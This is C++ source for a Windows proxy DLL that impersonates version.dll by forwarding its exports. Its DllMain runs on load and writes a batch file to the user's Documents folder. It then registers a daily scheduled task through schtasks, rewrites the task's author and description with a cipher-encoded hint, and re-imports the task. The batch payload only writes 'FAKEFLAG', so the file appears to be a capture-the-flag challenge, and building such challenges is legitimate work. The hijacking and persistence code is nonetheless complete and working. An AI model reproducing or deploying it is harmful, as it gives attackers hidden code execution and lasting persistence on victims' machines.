// dllmain.cpp : 定義 DLL 應用程式的進入點。
#include "pch.h"
#include <windows.h>
#include <string>
#include <fstream>
#include <comdef.h>
#include <atlbase.h>
#include <stdlib.h>
#include <locale>
#include <codecvt>
#include <thread>
#include <cstdio>

#pragma comment (linker, "/export:VerQueryValueW=" \
    "c:\\windows\\system32\\version.VerQueryValueW,@11")

#pragma comment (linker, "/export:VerQueryValueA=" \
    "c:\\windows\\system32\\version.VerQueryValueA,@10")

#pragma comment(linker, "/export:GetFileVersionInfoW=" \
    "c:\\windows\\system32\\version.GetFileVersionInfoW,@9")

#pragma comment (linker, "/export:GetFileVersionInfoA=" \
    "c:\\windows\\system32\\version.GetFileVersionInfoA,@1")

#pragma comment (linker, "/export:GetFileVersionInfoSizeW=" \
    "c:\\windows\\system32\\version.GetFileVersionInfoSizeW,@8")

#pragma comment (linker, "/export:GetFileVersionInfoSizeA=" \
    "c:\\windows\\system32\\version.GetFileVersionInfoSizeA,@5")

char* WcharToChar(const wchar_t* wstr) {
    if (wstr == nullptr) return nullptr;
    int bufferSize = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, nullptr, 0, nullptr, nullptr);
    char* str = new char[bufferSize];
    int bytesConverted = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, str, bufferSize, nullptr, nullptr);
    return str;
}

void ExecuteCommandHidden(const std::wstring& command) {
    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    wchar_t cmd[MAX_PATH];
    wcscpy_s(cmd, command.c_str());

    // 使用 CreateProcess 執行命令
    if (CreateProcessW(
        NULL,    // 應用程式名稱
        cmd,     // 命令行參數
        NULL,    // 預設安全性屬性
        NULL,    // 線程安全性屬性
        FALSE,   // 是否繼承句柄
        0,       // 創建標誌
        NULL,    // 環境變數
        NULL,    // 當前目錄
        &si,     // 啟動信息
        &pi      // 進程信息
    )) {
        // 等待命令完成
        WaitForSingleObject(pi.hProcess, INFINITE);
        // 關閉進程和線程句柄
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

std::wstring GetAuthorAndDescription() {
	std::wstring description = L"'<Author>Flydragon</Author><Description>jonh nh w hlojwhy jowj lmdwjd w RWYD rzwg rcm ice n wq tcbkdmnbg jowj lwb ice lmwly jonh heahjnjejncb lnfodm rzwg{KZZ_lmdwjd_/hl_KWNZI_/hj_07:00}</Description>'";
	return description;
}

void AddScheduledTask() {
    wchar_t username[100];
    DWORD size = 100;
    GetUserNameW(username, &size);

    std::wstring ducument_path = L"C:\\Users\\" + std::wstring(username) + L"\\Documents\\";

    
    std::wstring command = L"schtasks /create /sc DAILY /st 07:00:00 /tn \"CreateFlag\" /tr \"";
    command += L"C:\\Users\\" + std::wstring(username) + L"\\";
    command += L"Documents\\flag.bat\" /ru ";
    command += std::wstring(username);
    system(WcharToChar(command.c_str()));
    //ExecuteCommandHidden(command);
    

    //std::wstring command = L"powershell -Command \"$startTime = (Get-Date).AddMinutes(2).ToString('HH:mm'); schtasks /create /sc DAILY /st $startTime /tn 'CreateFlag' /tr 'C:Users\\user\\Documents\\flag.bat'\"";
    //std::wstring command = L"powershell -Command \"$startTime = (Get-Date).AddMinutes(2).ToString('HH:mm'); schtasks /create /sc DAILY /st $startTime /tn 'CreateFlag' /tr 'C:Users\\";
    //command += std::wstring(username) + L"\\Documents\\flag.bat'\"";
    //command += L"C:\\Users\\" + std::wstring(username) + L"\\";
    //command += L"Documents\\flag.bat\"\"";
    //system(WcharToChar(command.c_str()));
    //Sleep(2000);


    command = L"schtasks /query /tn \"CreateFlag\" /xml > ";
    command += L"C:\\Users\\" + std::wstring(username) + L"\\Documents\\";
    command += L"task.xml";

    system(WcharToChar(command.c_str()));
    //ExecuteCommandHidden(command);
    Sleep(1000);

    system("schtasks /delete /tn \"CreateFlag\" /f");
    Sleep(1000);

    //system("powershell -Command \"(Get-Content \"C:\\Users\\user\\task.xml\") -replace '<Author>.*?</Author>', '<Author>IT</Author>' | Set-Content \"C:\\Users\\user\\task.xml\"\"");

    command = L"powershell -Command \"(Get-Content \"";
    command += L"C:\\Users\\" + std::wstring(username) + L"\\Documents\\";
    command += L"task.xml\") -replace '<Author>.*?</Author>', " + GetAuthorAndDescription() + L" | Set-Content \"";
    command += L"C:\\Users\\" + std::wstring(username) + L"\\Documents\\";
    command += L"task.xml\"\"";
    system(WcharToChar(command.c_str()));
    //ExecuteCommandHidden(command);
    Sleep(1000);

    //system("schtasks /create /xml %USERPROFILE%\\task.xml /tn \"CreateFlag\"");
    command = L"schtasks /create /xml ";
    command += L"C:\\Users\\" + std::wstring(username) + L"\\Documents\\";
    command += L"task.xml /tn \"CreateFlag\"";
    system(WcharToChar(command.c_str()));
    //ExecuteCommandHidden(command);
    Sleep(1000);

    remove(WcharToChar((ducument_path + L"task.xml").c_str()));
    //command = L"echo FAKEFLAG > \"C:\\Users\\" + std::wstring(username) + L"\\Desktop\\flag.txt\"";
    //system(WcharToChar(command.c_str()));
}

void AddScheduledTaskThread()
{
    std::thread  taskThread(AddScheduledTask);
    taskThread.detach();
}


BOOL WriteToFile(const wchar_t* filePath, const wchar_t* content) {
    HANDLE hFile = CreateFile(filePath, FILE_APPEND_DATA, FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    //SetFilePointer(hFile, 0, NULL, FILE_END);

    DWORD bytesWritten;
    BOOL result = WriteFile(hFile, content, wcslen(content) * sizeof(wchar_t), &bytesWritten, NULL);
    CloseHandle(hFile);
    return result;
}

void BetterWriteToFile(const wchar_t filePath[], const char content[]) {
    // 將 wchar_t* 轉換為 std::string（以 UTF-8 格式保存）
    std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
    std::string path = converter.to_bytes(filePath);

    // 打開文件輸出流
    std::ofstream outFile(path, std::ios::out | std::ios::binary); // 使用二進制模式確保內容一致
    outFile.write(content, std::strlen(content));
    outFile.close();
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    std::wstring flagPath = L"";
    std::wstring batPath = L"";
    std::wstring batContent = L"";
    std::wstring targetPath = L"";
    DWORD username_len;
    std::ofstream outFile;
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        //MessageBox(0, L"Hello from DLL", L"Hijacked", 0);
        wchar_t username[100];
        username_len = 100;
        GetUserNameW(username, &username_len);
        //flagPath = L"C:\\Users\\" + std::wstring(username) + L"\\Desktop\\flag.txt";
        //dllPath = L"C:\\Users\\" + std::wstring(username) + L"\\Downloads\\VERSION.dll";
        batPath = L"C:\\Users\\" + std::wstring(username) + L"\\Documents\\flag.bat";
        //WriteToFile(flagPath.c_str(), L"Hijacked");

        batContent = (L"echo FAKEFLAG > \"C:\\Users\\" + std::wstring(username) + L"\\Desktop\\flag.txt\"");
        //WriteToFile(batPath.c_str(), L"echo Hijacked > \"%USERPROFILE%\\Desktop\\flag.txt\"");
        BetterWriteToFile(batPath.c_str(), WcharToChar(batContent.c_str()));
        AddScheduledTask();
        //AddScheduledTaskThread();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
